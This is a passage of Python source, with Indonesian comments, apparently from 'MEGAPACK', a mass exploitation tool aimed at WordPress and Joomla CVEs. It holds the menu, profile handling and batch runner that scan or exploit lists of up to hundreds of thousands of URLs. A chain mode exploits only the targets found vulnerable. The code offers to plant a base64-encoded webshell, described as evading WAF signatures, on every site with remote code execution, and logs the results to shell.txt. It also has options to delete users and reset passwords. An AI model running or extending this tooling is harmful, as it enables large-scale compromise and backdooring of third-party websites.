            print(f"   {i:2}) {n:16} {profile_summary(profs[n])}")
        if create_new:
            print(_c(_DIM, "    n) profil baru"))
        raw = _ask_raw("pilih")
        if raw is None:
            break
        if create_new and raw.lower() == "n":
            nama = _ask_raw("nama profil baru")
            if not nama:
                print(_c(_RED, "  [!] nama wajib"))
                continue
            profs[nama] = _blank_profile(nama)
            save_profiles(profs)
            return nama, profs[nama]
        try:
            idx = int(raw)
            if not 1 <= idx <= len(names):
                raise ValueError
        except ValueError:
            print(_c(_RED, "  [!] pilihan tidak valid"))
            continue
        n = names[idx - 1]
        return n, profs[n]

    n = names[0] if names else "default"
    if n not in profs:
        profs[n] = _blank_profile(n)
    print(_c(_DIM, f"  [i] profil dipakai: {n}"))
    return n, profs[n]


def pick_modules(accent: str) -> list[str]:
    mods = _modules_list()
    if not mods:
        print(_c(_YEL, "  [!] tidak ada modul"))
        return []
    print(_c(_BOLD, f"\n  {accent} — pilih modul"))
    print(_c(_DIM, "   0) semua | 1) per cluster | atau nomor (mis. 1,3,5-7)"))
    last = None
    for i, (cve, cl, title, status) in enumerate(mods, 1):
        if cl != last:
            print(_c(_PINK, f"\n     [{cl}]"))
            last = cl
        print(f"   {i:2}) {cve:20} {title[:50]}  {_c(_DIM, status)}")
    raw = ask("pilih", "0")
    if raw == "0":
        return [m[0] for m in mods]
    if raw == "1":
        cl = ask("cluster (wordpress/joomla_core/joomla_ext/joomla)")
        sel = [m[0] for m in mods if m[1] == cl]
        if not sel:
            print(_c(_YEL, "  [!] cluster kosong — memakai semua"))
            return [m[0] for m in mods]
        return sel
    picked: list[str] = []
    for part in raw.split(","):
        part = part.strip()
        if "-" in part:
            try:
                a, b = (int(x) for x in part.split("-", 1))
            except ValueError:
                continue
            picked += [m[0] for i, m in enumerate(mods, 1) if a <= i <= b]
        elif part.isdigit():
            i = int(part)
            if 1 <= i <= len(mods):
                picked.append(mods[i - 1][0])
    if not picked:
        print(_c(_YEL, "  [!] tidak ada yang dipilih — memakai semua"))
        return [m[0] for m in mods]
    seen: set[str] = set()
    return [x for x in picked if not (x in seen or seen.add(x))]


def _namespace(prof: dict, cves: list[str], exploit: bool, quiet: bool):
    """Bangun Namespace persis seperti argparse menghasilkan — engine tak diubah.

    PENTING (bug 2026-11-09): target TIDAK dipipakan ke argparse sebagai
    `-u` per baris. `parse_args()` bersifat KUADRATIK terhadap jumlah argumen:
    terukur 20.000 target = 0,9 s, dan 300.000 target > 5 menit tanpa satu pun
    request keluar — dari sisi operator itu terlihat seperti "tidak jalan".
    Sekarang target diset langsung ke Namespace (O(n) murni); argparse hanya
    memproses argumen kecil (cve/flag/opsi).
    """
    argv: list[str] = []

    for cv in cves:
        argv += ["--cve", cv]
    if exploit:
        argv += ["--exploit", "--i-know-what-im-doing"]
    if prof.get("deploy_shell"):
        argv += ["--deploy-shell"]
    if quiet:
        argv += ["-q"]

    for key, flag in (("api_token", "--api-token"), ("username", "--username"),
                      ("password", "--password"), ("category_ext", "--category-ext"),
                      ("contact_id", "--contact-id"), ("category_id", "--category-id"),
                      ("shell_url", "--shell-url"), ("proxy", "--proxy"),
                      ("new_password", "--new-password"),
                      ("deploy_name", "--deploy-name"),
                      ("deploy_password", "--deploy-password")):
        v = prof.get(key)
        if v not in (None, "", 0):
            argv += [flag, str(v)]

    if prof.get("field_id"):
        # modul Joomla memakai field_id sebagai int; 0 = tidak diset
        argv += ["--field-id", str(prof["field_id"])]
    if prof.get("delete_user"):
        argv += ["--delete-user", str(prof["delete_user"])]
    if prof.get("membership"):
        argv += ["--membership", str(prof["membership"])]
    if prof.get("threads"):
        argv += ["--threads", str(prof["threads"])]
    if prof.get("timeout"):
        argv += ["--timeout", str(prof["timeout"])]
    if prof.get("delay"):
        argv += ["--delay", str(prof["delay"])]

    args = build_parser().parse_args(argv)
    # target diset langsung (bukan lewat argv) — lihat docstring.
    args.url = list(prof.get("targets") or [])
    args.targets = (prof.get("targets_file") or "").strip() or None
    return args


def _gather_targets(prof: dict) -> list[str]:
    t: list[str] = []
    tf = (prof.get("targets_file") or "").strip()
    if tf and os.path.exists(tf):
        with open(tf, encoding="utf-8") as f:
            t += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    t += list(prof.get("targets") or [])
    return t


def _split_targets(raw: str) -> list:
    """Pecah teks bebas jadi daftar kandidat target (baris, koma, spasi)."""
    if not raw:
        return []
    out = []
    for chunk in raw.replace(",", "\n").splitlines():
        for tok in chunk.split():
            if tok:
                out.append(tok)
    return out


def _read_targets_file(path: str) -> list:
    """Baca file target: SATU URL PER BARIS (tahan BOM/CRLF/komentar/kutip)."""
    out = []
    with open(path, encoding="utf-8-sig", errors="replace") as f:
        for ln in f:
            v = ln.strip().strip('"').strip("'").strip()
            if not v or v.startswith("#"):
                continue
            out.append(v)
    return out


def _normalize_targets(items: list) -> list:
    """Bersihkan, buang duplikat & entri tak masuk akal; pertahankan urutan."""
    seen = set()
    out = []
    for it in items:
        u = (it or "").strip().strip('"').strip("'").strip()
        if not u or u.startswith("#"):
            continue
        low = u.lower()
        if low in ("url", "target", "targets", "host", "domain", "site"):
            continue
        try:
            key = norm_url(u).rstrip("/").lower()
        except Exception:  # noqa: BLE001
            continue
        if key in seen:
            continue
        seen.add(key)
        out.append(u)
    return out


def _plain_status(status: str) -> str:
    """Status tanpa kode warna — untuk file hasil / baris ringkas."""
    return re.sub(r"\033\[[0-9;]*m", "", status or "")


def _compact_lines(results, show_info: bool = False) -> list[str]:
    """Satu baris per (target, modul) yang punya temuan — pola output x1.py."""
    lines = []
    for t in sorted(results, key=lambda x: x.url):
        for cve in sorted(t.results):
            r = t.results[cve]
            st = _plain_status(r.get("status"))
            mod = REGISTRY.get(cve)
            title = (mod.title if mod else cve)[:44]
            if st in ("VULN", "RCE", "PWN"):
                lines.append(f"[+] {st:<5} {t.url:<44} {cve:<18} {title}")
            elif show_info and st in ("INFO", "UNKNOWN", "ERR"):
                lines.append(f"[~] {st:<5} {t.url:<44} {cve:<18} {title}")
    return lines


def _write_results(path: str, results) -> None:
    lines = [f"# MEGAPACK result — {len(results)} target"]
    hits = _compact_lines(results, show_info=True)
    lines += hits if hits else ["(tidak ada temuan)"]
    lines += ["", f"# ringkasan: {summary(results)}"]
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        print(_c(_GRN, f"  [+] hasil -> {path}"))
    except OSError as e:
        print(_c(_RED, f"  [!] gagal menulis {path}: {e}"))


def run_batch(targets: list, cves, prof: dict, exploit: bool,
              out_file: str = "", chain: bool = False,
              deploy_shell: bool = False, shell_out: str = "") -> None:
    """Jalankan modul (semua bila cves None/kosong) ke banyak target sekaligus."""
    if not targets:
        print(_c(_RED, "\n  [!] tidak ada target"))
        return
    prof2 = dict(prof)
    prof2["targets"] = list(targets)
    prof2["targets_file"] = ""
    args = _namespace(prof2, list(cves or []), exploit, quiet=False)
    args.report = None
    if chain:
        args.chain = True
        args.chain_mode = "serial"
    if deploy_shell:
        args.deploy_shell = True
        maybe_deploy_shell._flush_to = shell_out or None

    mods = selected_modules(args)
    print(_c(_CYN, f"\n  target={len(targets)}  modul={len(mods)}  "
                   f"mode={'EXPLOIT' if exploit else 'SCAN'}  threads={args.threads}"))
    if exploit:
        print(_c(_YEL, "  [!] mode EXPLOIT akan MEMUTASI target."))
        if ask("ketik 'ya' untuk lanjut").lower() != "ya":
            print(_c(_DIM, "  dibatalkan"))
            return
    if chain:
        args.shell_out = shell_out or None   # chain menulis shell.txt sendiri
        _run_chain_serial(targets, args, mods, out_file=out_file or "")
        return

    # Estimasi kasar: daftar besar tanpa umpan balik mudah disangka hang.
    # Catatan: kebanyakan target gugur di pre-flight (1 request), jadi angka
    # ini batas ATAS, bukan perkiraan realistis.
    est = len(targets) * max(1, len(mods)) * 0.25 / max(1, args.threads)
    if len(targets) > 20:
        print(_c(_DIM, f"  estimasi batas-atas: ~{est / 60:.1f} menit "
                       f"({len(targets)} target × {len(mods)} modul, "
                       f"{args.threads} thread; target mati gugur lebih cepat)"))

    total = len(targets)
    # Daftar besar: JANGAN tahan semua Target di RAM. 300k target x ~40
    # dict hasil = beberapa GB dan tool tampak mati sebelum progress apa pun.
    # Di atas ambang ini hasil di-stream ke file + dihitung bertahap.
    streaming = total > _STREAM_THRESHOLD
    results = []
    hits: list[Target] = []      # hanya target dengan VULN/RCE/PWN (untuk shell.txt)
    counts: dict[str, int] = {}
    hit_lines: list[str] = []
    fh = None
    if out_file:
        try:
            fh = open(out_file, "w", encoding="utf-8")
            if streaming:
                fh.write(f"# MEGAPACK result — {total} target (streaming)\n")
                fh.flush()
        except OSError as e:
            print(_c(_RED, f"  [!] gagal menulis {out_file}: {e}"))
            fh = None

    def _emit(t) -> None:
        """Catat satu Target: hitung status, cetak & tulis temuan segera."""
        for cve in sorted(t.results):
            r = t.results[cve]
            st = _plain_status(r.get("status"))
            counts[st] = counts.get(st, 0) + 1
            if st in ("VULN", "RCE", "PWN"):
                hits.append(t)
                mod = REGISTRY.get(cve)
                title = (mod.title if mod else cve)[:44]
                line = f"[+] {st:<5} {t.url:<44} {cve:<18} {title}"
                print(_c(_GRN, "  " + line), flush=True)
                if streaming:
                    hit_lines.append(line)
                    if fh:
                        fh.write(line + "\n")
                        fh.flush()
            elif streaming and st in ("INFO", "UNKNOWN", "ERR") and fh:
                fh.write(f"[~] {st:<5} {t.url:<44} {cve:<18}\n")

    done = 0
    _last_prog = 0.0
    _pct_mark = 0
    t0 = time.time()
    with cf.ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
        for fut in cf.as_completed([ex.submit(run_target, x, args) for x in targets]):
            done += 1
            try:
                t = fut.result()
                if not streaming:
                    results.append(t)
                _emit(t)
            except Exception as e:  # noqa: BLE001
                counts["ERR"] = counts.get("ERR", 0) + 1
                if not streaming:
                    t = Target(url="?")
                    t.notes.append(f"fatal: {type(e).__name__}: {e}")
                    results.append(t)
            # Progress: 0,5 dtk sekali saat TTY (bar di tempat), dan hanya
            # tiap 5% saat output dipipa/ke file — kalau tidak, 300k target
            # menghasilkan ratusan ribu baris bar. Bug 2026-11-09: `done % 25`
            # mencetak ratusan baris saat non-TTY.
            _tty = sys.stderr.isatty()
            if total > 1 and done < total and (
                    (time.time() - _last_prog) >= 0.5 if _tty
                    else done * 20 >= total * (_pct_mark + 1)):
                if not _tty:
                    _pct_mark += 1
                _last_prog = time.time()
                el = time.time() - t0
                rate = done / el if el > 0 else 0
                eta = (total - done) / rate if rate > 0 else 0
                pct = 100 * done / total
                bar_n = int(24 * done / total)
                bar = "\u2588" * bar_n + "\u2591" * (24 - bar_n)
                prefix = "\r" if _tty else ""
                print(f"{prefix}  [{bar}] {done}/{total} ({pct:4.1f}%) "
                      f"{rate:4.1f} t/s ETA {eta / 60:4.1f}m   ",
                      end="" if _tty else "\n", file=sys.stderr, flush=True)
    if total > 1:
        el = time.time() - t0
        print("\r" + " " * 78 + "\r", end="", file=sys.stderr, flush=True)
        print(_c(_DIM, f"  {total} target selesai dalam {el / 60:.1f} menit"))

    print()
    if streaming:
        if not hit_lines:
            print(_c(_DIM, "  (tidak ada VULN/RCE/PWN)"))
        ring = " | ".join(f"{k}={v}" for k, v in sorted(counts.items()))
        print(_c(_CYN, f"\n  selesai: {total} target | hasil modul: {ring}"))
        if fh:
            fh.write(f"\n# ringkasan: {total} target | hasil modul: {ring}\n")
    else:
        if not _compact_lines(results, show_info=False):
            print(_c(_DIM, "  (tidak ada VULN/RCE/PWN)"))
        print(_c(_CYN, f"\n  selesai: {len(results)} target | "
                       f"hasil modul: {summary(results)}"))
    if fh:
        fh.close()
        print(_c(_GRN, f"  [+] hasil -> {out_file}"))
    elif out_file:
        _write_results(out_file, results)
    if shell_out:
        write_shell_file(shell_out, hits if streaming else (results or []))


def execute(prof: dict, cves: list[str], exploit: bool) -> None:
    targets = _gather_targets(prof)
    if not targets:
        print(_c(_RED, "\n  [!] profil ini belum punya target."))
        print(_c(_DIM, "      isi lewat menu 3 → Pilihan modul/parameter → target"))
        return

    args = _namespace(prof, cves, exploit, quiet=False)
    mods = selected_modules(args)
    if not mods:
        print(_c(_RED, "  [!] tidak ada modul yang cocok"))
        return

    print(_c(_CYN, f"\n  target={len(targets)}  modul={len(mods)}  "
                   f"mode={'EXPLOIT' if exploit else 'SCAN'}"))
    if exploit:
        print(_c(_YEL, "  [!] mode EXPLOIT akan MEMUTASI target."))
        warn = ask("ketik 'ya' untuk lanjut")
        if warn.lower() != "ya":
            print(_c(_DIM, "  dibatalkan"))
            return

    args.report = None
    results = []
    show = len(targets) > 1 and sys.stdout.isatty()
    with cf.ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
        futs = {ex.submit(run_target, x, args): x for x in targets}
        for i, fut in enumerate(cf.as_completed(futs), 1):
            try:
                t = fut.result()
            except Exception as e:  # noqa: BLE001
                t = Target(url=norm_url(futs[fut]))
                t.notes.append(f"fatal: {type(e).__name__}: {e}")
            results.append(t)
            if show:
                print(f"\r  [{i}/{len(targets)}] {t.url[:58]:<58}",
                      end="", flush=True)
    if show:
        print("\r" + " " * 70 + "\r", end="")

    results.sort(key=lambda x: x.url)
    for t in results:
        for cve in sorted(t.results):
            mod = REGISTRY.get(cve)
            if mod is not None:
                emit_result(t, mod, t.results[cve], quiet=False)
        for n in t.notes:
            print(_c(_DIM, f"      · {t.url} {n}"))
    print(_c(_CYN, f"\n  selesai: {len(results)} target | {summary(results)}"))


def menu_profil(profs: dict) -> None:
    """Menu 3: pilih/ubah parameter — SEMUA sebagai pilihan, tanpa flag."""
    nama, prof = pick_profile(profs)
    while True:
        print(_c(_BOLD, f"\n  Parameter profil '{nama}'"))
        print(f"   1) target            : {profile_summary(prof)}")
        print(f"   2) file targets.txt  : {prof.get('targets_file') or '-'}")
        print(f"   3) token API Joomla  : {'(terisi)' if prof.get('api_token') else '-'}")
        print(f"   4) kredensial        : {prof.get('username') or '-'}")
        print(f"   5) field-id          : {prof.get('field_id') or '-'}"
              f"   | delete-user: {prof.get('delete_user') or '-'}")
        print(f"   6) contact-id        : {prof.get('contact_id') or '-'}")
        print(f"   7) category-id / ext : {prof.get('category_id') or '-'} / {prof.get('category_ext')}")
        print(f"   8) threads / timeout : {prof.get('threads')} / {prof.get('timeout')}")
        print(f"   9) delay / proxy     : {prof.get('delay')} / {prof.get('proxy') or '-'}")
        print("   0) simpan & kembali")
        ch = ask("pilih")
        if ch == "0":
            profs[nama] = prof
            save_profiles(profs)
            print(_c(_GRN, f"  [+] profil '{nama}' disimpan"))
            return
        if ch == "1":
            print(_c(_DIM, "      pisah dengan koma; kosongkan untuk hapus daftar"))
            raw = ask("URL target")
            if raw:
                prof["targets"] = [u.strip() for u in raw.split(",") if u.strip()]
            elif ask("hapus daftar target? (y/N)").lower() == "y":
                prof["targets"] = []
        elif ch == "2":
            raw = ask("path targets.txt")
            if raw:
                prof["targets_file"] = raw
            elif ask("hapus? (y/N)").lower() == "y":
                prof["targets_file"] = ""
        elif ch == "3":
            print(_c(_DIM, "      g) generate dari secret/uid/seed, atau tempel token langsung"))
            raw = ask("token / 'g'")
            if raw.lower() == "g":
                token_generator_menu()
            elif raw:
                prof["api_token"] = raw
            elif ask("hapus token? (y/N)").lower() == "y":
                prof["api_token"] = ""
        elif ch == "4":
            u = ask("username")
            if u:
                prof["username"] = u
                p = ask("password")
                if p:
                    prof["password"] = p
            elif ask("hapus kredensial? (y/N)").lower() == "y":
                prof["username"] = prof["password"] = ""
        elif ch == "5":
            v = ask("field-id", str(prof.get("field_id") or ""))
            if v.isdigit():
                prof["field_id"] = int(v)
            d = ask("delete-user (ID user yang dihapus; kosong = tidak pernah)",
                    str(prof.get("delete_user") or ""))
            prof["delete_user"] = int(d) if d.isdigit() else 0
        elif ch == "6":
            v = ask("contact-id", str(prof.get("contact_id") or ""))
            prof["contact_id"] = v
        elif ch == "7":
            v = ask("category-id", str(prof.get("category_id") or ""))
            prof["category_id"] = v
            e = ask("category-ext", prof.get("category_ext") or "com_content")
            prof["category_ext"] = e
        elif ch == "8":
            prof["threads"] = ask_int("threads", prof.get("threads") or 8)
            prof["timeout"] = ask_float("timeout", prof.get("timeout") or 20.0)
        elif ch == "9":
            prof["delay"] = ask_float("delay", prof.get("delay") or 0.0)
            v = ask("proxy", prof.get("proxy") or "")
            prof["proxy"] = v


def menu_modul() -> None:
    mods = _modules_list()
    print(_c(_BOLD, f"\n  {len(mods)} modul terdaftar"))
    last = None
    for cve, cl, title, status in mods:
        if cl != last:
            print(_c(_PINK, f"\n   [{cl}]"))
            last = cl
        print(f"   {cve:20} {title[:54]:54} {_c(_DIM, status)}")


def menu_mass(profs: dict) -> None:
    """Menu 6: daftar target × SEMUA modul — all-in-one seperti x1.py."""
    print(_c(_BOLD, "\n  MASS — daftar target, semua modul dicoba per target"))
    print(_c(_DIM, "  Sumber target: 1) file targets.txt  2) tempel daftar URL"))

    src = ask("pilih sumber (1/2)", "1")
    if src == "1":
        path = ask("path file targets.txt", "targets.txt")
        if not os.path.exists(path):
            print(_c(_RED, f"  [!] file tidak ada: {path}"))
            return
        raw_targets = _read_targets_file(path)
    else:
        raw = ask_multiline("URL (pisah koma/baris)")
        raw_targets = _split_targets(raw)

    targets = _normalize_targets(raw_targets)
    if not targets:
        print(_c(_RED, "  [!] tidak ada target valid"))
        return

    n_raw = len(raw_targets)
    n_uniq = len(targets)
    msg = f"  {n_uniq} target valid"
    if n_raw != n_uniq:
        msg += f" (dari {n_raw} baris — {n_raw - n_uniq} duplikat/kosong)"
    print(_c(_CYN, msg))
    if n_uniq > 200:
        print(_c(_YEL, f"  [!] daftar besar: {n_uniq} target."))
        if ask("lanjut? (ya/tidak)", "ya").lower() != "ya":
            print(_c(_DIM, "  dibatalkan"))
            return

    mods = _modules_list()
    print(_c(_BOLD, "\n  Modul yang diuji:"))
    print("   1) SEMUA modul (Joomla + WordPress — yang tidak cocok otomatis SKIP)")
    print("   2) hanya Joomla Core")
    print("   3) hanya Joomla Extensions")
    print("   4) Joomla SEMUA (Core + Extensions) — satu perintah")
    print("   5) hanya WordPress")
    print("   6) pilih manual")
    pick = ask("pilih", "1")
    cves: list[str] = []
    if pick == "2":
        cves = [m[0] for m in mods if m[1] == "joomla_core"]
    elif pick == "3":
        cves = [m[0] for m in mods if m[1] == "joomla_ext"]
    elif pick == "4":
        cves = [m[0] for m in mods if m[1] in ("joomla_core", "joomla_ext")]
    elif pick == "5":
        cves = [m[0] for m in mods if m[1] == "wordpress"]
    elif pick == "6":
        cves = pick_modules("MASS")
    # pick == "1" -> cves kosong = semua modul

    print("  mode: 1) scan  2) exploit semua  3) CHAIN (scan dulu, exploit hanya yang VULN)")
    mode = ask("mode", "1")
    exploit = mode in ("2", "3")
    chain = mode == "3"

    threads = ask_int("threads", profs[sorted(profs)[0]].get("threads") or 8)
    prof = dict(profs[sorted(profs)[0]])
    prof["threads"] = threads

    out = ask("simpan hasil ke file (kosongkan = tidak)", "")

    deploy_shell = False
    shell_out = ""
    if exploit:
        print(_c(_DIM, "  RCE yang ditemukan dapat langsung ditanami webshell 0xfay"))
        print(_c(_DIM, "  (payload base64 + stub dekoder — lolos WAF signature)"))
        if ask("tanam webshell pada setiap RCE? (ya/tidak)", "tidak").lower() == "ya":
            deploy_shell = True
            shell_out = ask("file daftar shell", "shell.txt")
            prof["deploy_name"] = ask("nama berkas shell (kosong = acak)", "") or None
            prof["deploy_password"] = ask("password shell (kosong = acak)", "") or None

    run_batch(targets, cves, prof, exploit, out_file=out, chain=chain,
              deploy_shell=deploy_shell, shell_out=shell_out)


def menu_report(profs: dict) -> None:
    pick_profile(profs, create_new=False)
    out = ask("nama file report", "MEGAPACK-report.md")
    load_modules(os.path.join(_HERE, "modules"))
    try:
        path = write_report(out)
        print(_c(_GRN, f"  [+] report -> {path}"))
    except Exception as e:  # noqa: BLE001
        print(_c(_RED, f"  [!] gagal: {e}"))


MENU = """
   1) Scan        — satu profil, pilih modul (tidak memutasi)
   2) Exploit     — satu profil, pilih modul (mutasi, butuh konfirmasi)
   3) Profil      — target, token, kredensial, id record
   4) Modul       — daftar CVE yang tersedia
   5) Report      — tulis report agregat
   6) Mass        — daftar target × SEMUA modul (all-in-one, pola x1.py)
   0) Keluar
"""


def menu_main() -> int:
    """Entrypoint menu interaktif (dulu poc.py; kini bagian dari mp.py)."""
    profs = load_profiles()
    save_profiles(profs)
    load_modules(os.path.join(_HERE, "modules"))

    while True:
        banner()
        print(MENU)
        ch = ask("pilih", "0")
        try:
            if ch == "0":
                return 0
            if ch == "1":
                nama, prof = pick_profile(profs)
                cves = pick_modules(f"SCAN · profil '{nama}'")
                if cves:
                    execute(prof, cves, exploit=False)
            elif ch == "2":
                nama, prof = pick_profile(profs)
                cves = pick_modules(f"EXPLOIT · profil '{nama}'")
                if cves:
                    execute(prof, cves, exploit=True)
            elif ch == "3":
                menu_profil(profs)
            elif ch == "4":
                menu_modul()
            elif ch == "5":
                menu_report(profs)
            elif ch == "6":
                menu_mass(profs)
            else:
                print(_c(_RED, "  [!] pilihan tidak valid"))
        except KeyboardInterrupt:
            print(_c(_YEL, "\n  [!] dibatalkan"))
        except Exception as e:  # noqa: BLE001
            print(_c(_RED, f"  [!] error: {type(e).__name__}: {e}"))
        pause()


if __name__ == "__main__":
    # Output tidak boleh ter-buffer saat dipipa/redirect. Tanpa ini, run panjang
    # (pra-filter 300k target) tampak MATI: proses hidup tapi nol baris keluar.
    for _st in (sys.stdout, sys.stderr):
        try:
            _st.reconfigure(line_buffering=True)
        except Exception:  # noqa: BLE001
            pass
    # Saat dijalankan sebagai script, `import mp` di modul akan memuat file ini
    # KEDUA KALI dan menulis ke REGISTRY yang berbeda. Alias-kan saja.
    sys.modules.setdefault("mp", sys.modules[__name__])
    # Tanpa argumen (atau -m/--menu) -> menu interaktif; selain itu CLI biasa.
    if len(sys.argv) == 1 or sys.argv[1] in ("-m", "--menu"):
        sys.exit(menu_main())
    sys.exit(cli_main())
